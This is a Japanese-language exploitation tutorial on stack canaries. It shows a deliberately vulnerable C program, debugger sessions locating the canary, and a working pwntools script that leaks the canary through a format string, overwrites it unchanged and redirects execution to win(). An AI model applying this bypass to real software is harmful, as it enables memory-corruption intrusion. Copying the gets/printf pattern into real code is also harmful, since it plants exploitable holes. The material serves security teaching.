---
description: バッファオーバーフローへの防御
---

# スタックカナリア(Stack Canaries)

スタックカナリアはとても単純な仕組みです。関数の冒頭でランダムな値がスタックに置かれ、プログラムが `ret` を実行する前に、その変数の現在の値が最初の値と比較されます。同じであれば、バッファオーバーフローは起きていません。

異なっていれば、攻撃者が戻りポインタを制御するためにオーバーフローを試みたことになり、プログラムはクラッシュします。多くの場合、`***stack smashing detected***` というエラーメッセージが表示されます。

{% hint style="info" %}
Linux では、スタックカナリアは `00` で終わります。これは、print 系の関数を使う際にミスをしても文字列がそこで null 終端されるようにするためですが、そのおかげでカナリアを見つけやすくもなっています。
{% endhint %}

## カナリアのバイパス

カナリアをバイパスする方法は 2 つあります。

### リークする

これはかなり幅広い話で、バイナリごとに異なりますが、狙いは値を読み取ることです。最も簡単なのは、**書式文字列(format string)**があればそれを使うことです。カナリアも他のローカル変数と同じくスタック上にあるので、スタックから値をリークできれば簡単です。

#### ソース

```c
#include <stdio.h>

void vuln() {
    char buffer[64];

    puts("Leak me");
    gets(buffer);

    printf(buffer);
    puts("");

    puts("Overflow me");
    gets(buffer);
}

int main() {
    vuln();
}

void win() {
    puts("You won!");
}
```

ソースはとても単純で、書式文字列の脆弱性のあとに、バッファオーバーフローの脆弱性があります。書式文字列でカナリアの値をリークし、その値でカナリア自身を上書きします。こうすれば、カナリアの値が変わらないのでチェックに引っかからずに、カナリアを越えてオーバーフローできます。あとは `win()` を実行するだけです。

#### 32 ビット

{% file src="../../.gitbook/assets/canary-32.zip" caption="Canary - 32-bit" %}

まず、カナリアが**あるか**を確認します。

```text
$ pwn checksec vuln-32 
[*] 'vuln-32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

確かにあります。次にカナリアのオフセットを計算する必要があります。これには radare2 を使います。

```text
$ r2 -d -A vuln-32

[0xf7f2e0b0]> db 0x080491d7
[0xf7f2e0b0]> dc
Leak me
%p
hit breakpoint at: 80491d7
[0x080491d7]> pxw @ esp
0xffd7cd60  0xffd7cd7c 0xffd7cdec 0x00000002 0x0804919e  |...............
0xffd7cd70  0x08048034 0x00000000 0xf7f57000 0x00007025  4........p..%p..
0xffd7cd80  0x00000000 0x00000000 0x08048034 0xf7f02a28  ........4...(*..
0xffd7cd90  0xf7f01000 0xf7f3e080 0x00000000 0xf7d53ade  .............:..
0xffd7cda0  0xf7f013fc 0xffffffff 0x00000000 0x080492cb  ................
0xffd7cdb0  0x00000001 0xffd7ce84 0xffd7ce8c 0xadc70e00  ................
```

最後の値がカナリアです。「バッファの開始位置」からおよそ 64 バイト後にあり、バッファの末尾に近いはずだからです。また、`00` で終わっていてとてもランダムに見えるので、`f7` や `ff` で始まる libc やスタックのアドレスとは違うとわかります。アドレスの数を数えるとその値までおよそ 24 個なので、念のため前後 1 つずつも調べます。

```text
$./vuln-32

Leak me
%23$p %24$p %25$p
0xa4a50300 0xf7fae080 (nil)
```

`%23$p` にあるようです。スタックカナリアは新しいプロセスごとにランダム化されるので、値は毎回異なる点に注意してください。

次に、pwntools でカナリアの取得を自動化します。

```python
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')
```

```text
$ python3 exploit.py 
[+] Starting local process './vuln-32': pid 14019
[*] b'Leak me\n'
[+] Canary: 0xcc987300
```

あとは、カナリアまでのオフセットと、カナリアの後ろから戻りポインタまでのオフセットを求めるだけです。

```text
$ r2 -d -A vuln-32
[0xf7fbb0b0]> db 0x080491d7
[0xf7fbb0b0]> dc
Leak me
%23$p
hit breakpoint at: 80491d7
[0x080491d7]> pxw @ esp
[...]
0xffea8af0  0x00000001 0xffea8bc4 0xffea8bcc 0xe1f91c00
```

カナリアは `0xffea8afc` にあることがわかります。少しあとにある `0xffea8b0c` が戻りポインタだと考えられます(推測)。次の `gets()` の直後にブレークして、何の値で上書きされたか確認しましょう(De Bruijn パターンを使います)。

```text
[0x080491d7]> db 0x0804920f
[0x080491d7]> dc
0xe1f91c00
Overflow me
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
hit breakpoint at: 804920f
[0x0804920f]> pxw @ 0xffea8afc
0xffea8afc  0x41574141 0x41415841 0x5a414159 0x41614141  AAWAAXAAYAAZAAaA
0xffea8b0c  0x41416241 0x64414163 0x41654141 0x41416641  AbAAcAAdAAeAAfAA
```

これでカナリアと EIP のオフセットを確認できます。

```text
[0x0804920f]> wopO 0x41574141
64
[0x0804920f]> wopO 0x41416241
80
```

戻りポインタはカナリアの先頭から 16 バイト後、つまりカナリアの末尾から 12 バイト後です。

```python
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)  # overwrite canary with original value to not trigger
payload += b'A' * 12    # pad to return pointer
payload += p32(0x08049245)

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))
```

#### 64 ビット

ソースもアプローチも同じで、64 ビットになっただけです。答えを見る前に、自分で試してみてください。

{% hint style="info" %}
64 ビットでは、書式文字列はまず該当するレジスタを参照し、さらに各アドレスが 8 バイトなので、オフセットが異なる可能性があることを思い出してください。
{% endhint %}

{% file src="../../.gitbook/assets/canary-64.zip" caption="Canary - 64-bit" %}

### カナリアのブルートフォース

これは 32 ビットでは_可能_で、避けられない場合もあります。しかし 64 ビットでは現実的ではありません。

想像がつくとおり、基本的な考え方は、当たるまでランダムなカナリア値でプロセスを何度も何度も実行することです。当たったかどうかは、`flag{` のような既知の平文が出力されるかで判別できます。ただし実行に非常に時間がかかり、正直なところあまり面白い問題でもありません。

